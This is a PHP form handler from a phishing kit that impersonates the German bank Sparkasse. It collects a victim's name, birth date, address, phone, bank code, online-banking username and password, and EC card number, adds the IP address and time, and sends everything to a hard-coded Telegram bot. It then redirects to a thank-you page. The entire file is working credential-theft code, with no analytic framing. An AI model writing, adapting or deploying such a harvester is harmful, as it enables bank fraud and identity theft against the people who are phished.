<?php

// Capture the IP address and time of submission
$ip = getenv("REMOTE_ADDR");
$time = date("d-m-Y - H:i");

// Construct the message with the structured format
$message = "----- 🌐SPARKASSE🌐-----\n\n";
$message .= "Vorname: " . $_POST['Vorname'] . "\n";
$message .= "Nachname: " . $_POST['Nachname'] . "\n";
$message .= "Geburtsdatum: " . $_POST['Geburtsdatum'] . "\n";
$message .= "Telefonnummer: " . $_POST['Telefonnummer'] . "\n";
$message .= "Adresse: " . $_POST['Adresse'] . "\n";
$message .= "Postcode: " . $_POST['Postcode'] . "\n";
$message .= "BLZ: " . $_POST['BLZ'] . "\n";
$message .= "Anmeldename: " . $_POST['Anmeldename'] . "\n";
$message .= "Passwort-OBP: " . $_POST['PasswortOBP'] . "\n";
$message .= "EC-Kartennummer: " . $_POST['ECCardNumber'] . "\n\n";
$message .= "TIME: $time\n";
$message .= "IP: $ip\n";

// Telegram bot configuration
$botToken = "7457987116:AAGXpCyNTRk7STS6Jr1-1pm74MCmtV2SRwo";
$chatID = "-1002273241778";
$website = "https://api.telegram.org/bot" . $botToken;

// Prepare data for Telegram API request
$params = [
    'chat_id' => $chatID,
    'text' => $message,
];

// Send message to Telegram
$ch = curl_init($website . '/sendMessage');
curl_setopt($ch, CURLOPT_HEADER, false);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, $params);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
$result = curl_exec($ch);
curl_close($ch);

// Redirect to billing page after submission
header("Location: ./thankyou.html");
exit();
